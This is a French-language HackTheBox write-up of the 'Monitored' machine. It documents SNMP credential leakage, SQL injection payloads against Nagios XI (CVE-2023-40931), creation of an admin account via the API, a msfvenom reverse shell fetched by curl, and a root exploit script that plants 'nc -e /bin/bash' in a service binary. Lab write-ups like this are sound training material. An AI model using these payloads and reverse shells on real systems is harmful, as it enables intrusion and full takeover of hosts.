---
title: HTB | Monitored
description: Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application's dashboard. From there, a SQL injection (CVE-2023-40931) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, sudo access to a bash script is abused to read the root user's SSH key and authenticate as root (<-- Not the way I got root)
slug: monitored-htb
date: 2025-11-12 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
 <tr>
 <!-- Colonne gauche : logo -->
 <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
 <img src="cover.png" alt="Monitored cover" width="120">
 </td>
 <td style="border:none; text-align:center; vertical-align:middle;">
 <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
 <thead>
 <tr>
 <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
 <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
 <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
 <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td style="padding:8px; border:1px solid #ddd; text-align:center;">Monitored</td>
 <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
 <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.248</td>
 <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
 </tr>
 </tbody>
 </table>
 </td>
 </tr>
</table>

## Users
```bash
svc : XjH7VCehowpR1xZB
```

## Enumeration

### nmap TCP
```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.248
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABg
|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Public Key type: rsa10.10.11.248
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a55607a5f047d983864504d67cfe0
| SHA-1: 610938448c36b08b0ae8a132971c8e89cfac2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped syn-ack ttl 63
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/10%OT=22%CT=1%CU=37179%PV=Y%DS=2%DC=T%G=Y%TM=691219
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## Foothold

### SNMP
Avec un scan nmap sur les ports **UDP**, on comprend que le port **SNMP** est ouvert. Avec **nmap**, on effectue plusieurs commandes SNMP et on trouve des credentials:
- svc / "XjH7VCehowpR1xZB"

```bash
$ nmap -vv --reason -Pn -T4 -sU -sV -p 161 --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/opt/my-resources/setup/zsh/results/10.10.11.248/scans/udp161/udp_161_snmp-nmap.txt" -oX "/opt/my-resources/setup/zsh/results/10.10.11.248/scans/udp161/xml/udp_161_snmp_nmap.xml" 10.10.11.248
|   631: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```

### Nagios XI - Cannot login
Le user/pass ne fonctionne pas "The specified user account has been disabled or does not exist."

### SQL Injection
En cherchant sur internet, on trouve la CVE suivante (que l'on teste à l'aveugle car on ne connait pas la version de Nagios XI qui est installée) : **CVE-2023-40931**

A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to **/nagiosxi/admin/banner_message-ajaxhelper.php**

```bash
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=lmeogjafdeiommcbnhu1k7s9lh
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 204

action=acknowledge_banner_message&token=9f86697945abf56d35a7ee14233bef5b481a51be&id=3+OR+(SELECT+7402+FROM(SELECT+COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)

-----------------------

    <p><pre>SQL Error [nagiosxi] : Duplicate entry '10.5.23-MariaDB-0+deb11u11' for key 'group_key'</pre></p>
{"message":"Failed to acknowledge message.","msg_type":"error"}

```
On récupère le hachage Admin, que l'on ne réussit pas à déchiffrer.
```bash
action=acknowledge_banner_message&token=9f86697945abf56d35a7ee14233bef5b481a51be&id=3+OR+(SELECT+7402+FROM(SELECT+COUNT(*),CONCAT((select+username+from+xi_users+LIMIT+1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)

>>> SQL Error [nagiosxi] : Duplicate entry 'nagiosadmin1' for key 'group_key' # --> nagiosadmin (le "1" est raouté par FLOOR(...))

action=acknowledge_banner_message&token=9f86697945abf56d35a7ee14233bef5b481a51be&id=3+OR+(SELECT+7402+FROM(SELECT+COUNT(*),CONCAT((select+password+from+xi_users+LIMIT+1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)

>>> SQL Error [nagiosxi] : Duplicate entry '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C1' for key 'group_key'
```

J'ai tenté de bruteforce le hash mais ça n'a pas fonctionné : j'avais oublié que chaque résultat de requete SQL rajoutait un "1" à la fin... Donc mon hash était en vérité:
> $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C    <---- sans la 1 !!
(Mais ça n'a pas fonctionné de toute manière)

`xi_users` table:
> user_id, username, password, name, email, backend_ticket, enabled, api_key, api_enabled, login_attempts, last_attempt, last_password_change, last_login, last_edited, ...

J'ai récupérer les colonnes de la table xi_users en utilisant ce type de requêtes :
```bash
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='xi_users' limit 1
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='xi_users' limit 1,1
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='xi_users' limit 2,1
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='xi_users' limit 3,1
...
```
On réussi à récupérer la clé API de l'administateur :
```bash
# If you have "..." because your string is very long
select api_key from xi_users limit 1
>>> 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9C...'
# You can use SUBSTRING multiple times to dump the string
select SUBSTRING(api_key, 1, 10) from xi_users limit 1
```

> IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

En récupérant les requête API utilisé sur une autre exploit disponible (récente), j'ai pu créer un nouvel utilisateur Administrateur :
```bash
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1 HTTP/1.1
Host: 10.10.11.248

username=Lu6Wk&password=DxMkC&name=Lu6Wk&email=Lu6Wk%40mail.com&auth_level=admin
```

On peut alors ensuite se connecter sur l'interface graphique de nagios XI avec ce nouvel utilisateur et créer des commandes sur cette page :
```bash
GET /nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1

------------------------

https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=modify&type=command&id=158&page=1&returnUrl=index.php%3Fcmd%3Dview%26type%3Dcommand%26page%3D1
>>> Command Line : cat user.txt

------------------------

GET /nagiosxi/includes/components/nagioscorecfg/applyconfig.php

------------------

GET /nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid=158&nsp=443df18d3ff18d83e02a7bb13fc42870f7b73046851cecd9e301897d427f8a5e HTTP/1.1
Host: nagios.monitored.htb
User-Agent: python-requests/2.32.4
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: nagiosxi=8pi6o9q2kph72ugu230v9vjq2g

>>>>>>>>>>>>>>
HTTP/1.1 200 OK
...
[nagios@monitored ~]$ cat user.txt
213b4331f50e5f1072d301938db28331
```

### Stable Shell 

```bash
# Reverse Shell Linux ELF
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=1337 -f elf > shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

$ http-server 80                                                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.248 - - [11/Nov/2025 19:58:51] "GET /shell HTTP/1.1" 200 -

------------------------------

Through Burp, I executed 3 commands in a row :
- curl http://10.10.14.14/shell -O shell
- chmod 777 shell
- ./shell

------------------------------

$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.11.248.
Ncat: Connection from 10.10.11.248:53330.

python3 -c 'import pty;pty.spawn("/bin/bash")'
nagios@monitored:/home/nagios$ export TERM=xterm
export TERM=xterm
nagios@monitored:/home/nagios$ ^Z
[1]  + 68520 suspended  nc -lnvp 1337
$ stty raw -echo;fg                   
[1]  + 68520 continued  nc -lnvp 1337
nagios@monitored:/home/nagios$ whoami
nagios
nagios@monitored:/home/nagios$ ls
cookie.txt  shell  user.txt
nagios@monitored:/home/nagios$ cat user.txt 
213b4331f50e5f1072d301938db28331
```

### SSH to nagios
```bash
nagios@monitored:/home/nagios$ cd .ssh
nagios@monitored:/home/nagios/.ssh$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/nagios/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/nagios/.ssh/id_rsa
Your public key has been saved in /home/nagios/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:2NBZpIJ+HjRmFS93s8DRbV8sAp4rqh+3kPsTvXVzki0 nagios@monitored
The key s randomart image is:
+---[RSA 3072]----+
......
+----[SHA256]-----+
nagios@monitored:/home/nagios/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC....id8HqID90SBHsANCYUhofRFH5rCG3alGvYyYNMu+Wk= nagios@monitored
nagios@monitored:/home/nagios/.ssh$ mv id_rsa.pub authorized_keys
nagios@monitored:/home/nagios/.ssh$ ls
authorized_keys  id_rsa
nagios@monitored:/home/nagios/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5v.......c0Btb25pdG9yZWQBAg==
-----END OPENSSH PRIVATE KEY-----

--------------------

# Copy the id_rsa to my machine and connect to nagios using SSH
$ vim nagios.key
$ chmod 600 nagios.key 
$ ssh nagios@10.10.11.248 -i nagios.key
Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
...
Last login: Wed Mar 27 10:32:47 2024 from 10.10.14.23
nagios@monitored:~$ whoami
nagios
nagios@monitored:~$ cat user.txt 
213b....8331
```

## Privilege Escalation

### CVE-2024-24402
Je lance une recherche sur google :
- "exploit nagiosxi script as root"
ce qui m'amène vers ce lien :
- https://gist.github.com/sec-fortress/6d128a5e290e873be4c2ca27b6579eca

ou encore la recherche :
- "cve nagioxi priv esc"
qui m'amène vers ce lien, expliquant la même CVE :
- https://github.com/MAWK0235/CVE-2024-24402

En faisant sudo -l, on se rend compte qu'on peut executer beaucoup de binaires en tant que **root** avec sudo. En regardant de plus près les scripts, il ne s'agit que de scripts de **nagiosxi** qui n'ont pas subis de modification.

Ce qui veut signifie que s'il existe un moyen d'exploiter ces binaires, il existe probablement une **CVE** sur internet. Et si ne n'est pas le cas, ils ne sont pas surement pas exploitables.
```bash
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
Voici ce que contient le fichier executable nous permettant d'exploiter `/usr/local/nagiosxi/scripts/manage_services.sh` pour devenir root :  
`exploit.sh `
```bash
#!/bin/bash

# Create npcd script
echo "#!/bin/bash" > /tmp/npcd
echo "nc -e /bin/bash 10.10.14.14 4445" >> /tmp/npcd

# Grant executable permissions on the npcd script
chmod +x /tmp/npcd 2>/dev/null

# Stop the npcd service
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd

# Replace original npcd script
cp /tmp/npcd /usr/local/nagios/bin/npcd 2>/dev/null

echo "[+] Start Up your listener"
sleep 1
echo "[+] nc -lvnp 4445"

sleep 15

echo "[+] Expect your shellzz xD"

# start service to recieve reverse shell
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd

sleep 5

echo "[+] done"
```
Il faut donc remplacer le binaire **ntpd** par un faux contenant un reverse shell, puis redemarrer le service en utilisant le script **manage_services.sh** avec **sudo**.
```bash
nagios@monitored:~$  ./exploit.sh 
[+] Start Up your listener
[+] nc -lvnp 4445
[+] Expect your shellzz xD
[+] done

-------------------------

nc -lnvp 4445
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 10.10.11.248.
Ncat: Connection from 10.10.11.248:40642.
whoami
root
cd /root
cat root.txt
cf92....0a0a
```